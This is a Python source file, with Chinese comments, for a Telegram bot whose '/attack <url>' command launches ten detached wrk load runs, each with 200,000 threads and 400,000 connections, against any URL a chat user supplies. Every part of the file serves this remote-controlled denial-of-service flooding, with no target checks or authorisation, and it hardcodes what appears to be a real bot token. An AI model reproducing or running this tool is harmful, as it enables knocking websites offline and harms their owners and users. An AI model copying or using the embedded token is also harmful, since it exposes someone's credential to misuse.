import requests
import random
import string
import subprocess

# 机器人Token
BOT_TOKEN = "8186635677:AAHzO7cLQbegebCvXgQKi3sYj53xLysVm-I"
BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# 随机生成screen名称
def generate_screen_name():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

# 执行攻击命令
def execute_attack(url: str):
    screen_name = generate_screen_name()
    command = f"screen -dmS {screen_name} bash -c 'ulimit -n 1000000 && wrk -t200000 -c400000 -d120s {url}'"
    results = []
    try:
        for i in range(10):
            subprocess.run(command, shell=True, check=True)
            results.append(f"Task {i+1}: Executed")
    except subprocess.CalledProcessError as e:
        results.append(f"Error: {e}")
    return "\n".join(results)

# 获取更新消息
def get_updates(offset=None):
    params = {"offset": offset, "timeout": 30}
    response = requests.get(f"{BASE_URL}/getUpdates", params=params)
    return response.json()

# 发送消息
def send_message(chat_id, text):
    data = {"chat_id": chat_id, "text": text}
    requests.post(f"{BASE_URL}/sendMessage", data=data)

# 主循环
def main():
    last_update_id = None

    while True:
        updates = get_updates(offset=last_update_id)

        if "result" in updates and updates["result"]:
            for update in updates["result"]:
                last_update_id = update["update_id"] + 1

                # 获取消息和发送者信息
                message = update.get("message", {})
                chat_id = message.get("chat", {}).get("id")
                text = message.get("text", "")

                # 检测命令 /attack
                if text.startswith("/attack"):
                    parts = text.split()
                    if len(parts) != 2:
                        send_message(chat_id, "Usage: /attack <url>")
                        continue

                    url = parts[1]
                    send_message(chat_id, f"Starting attack on {url}...")

                    # 执行攻击命令
                    results = execute_attack(url)

                    # 返回结果
                    send_message(chat_id, f"Attack results:\n{results}")

if __name__ == "__main__":
    main()
